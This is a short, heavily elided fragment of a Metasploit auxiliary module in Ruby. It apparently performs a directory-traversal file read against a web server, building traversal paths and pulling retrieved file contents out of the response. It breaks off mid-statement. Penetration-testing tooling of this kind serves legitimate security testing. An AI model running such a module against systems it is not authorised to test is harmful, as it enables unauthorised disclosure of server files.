...
class MetasploitModule < Msf::Auxiliary
  ...
  def run_host(ip)
    ...
    if datastore['ABSOLUTE']
      ...
      travs << "/" unless (datastore['FILEPATH'][0] == "\\") || (datastore['FILEPATH'][0] == "/")
    ...
    if res && (res.code == 200) && res.body =~ /Last 100000000 kilobytes of/ && res.body =~ /File name/ && !(res.body =~ /<br\/>File not found.<br\/>/)
      print_good("#{rhost}:#{rport} - File retrieved successfully!")
      start_contents = res.body.index("<pre>") + 7
      end_contents = res.body.rindex("</pre>") - 1
      if start_contents.nil? || end_contents.nil?
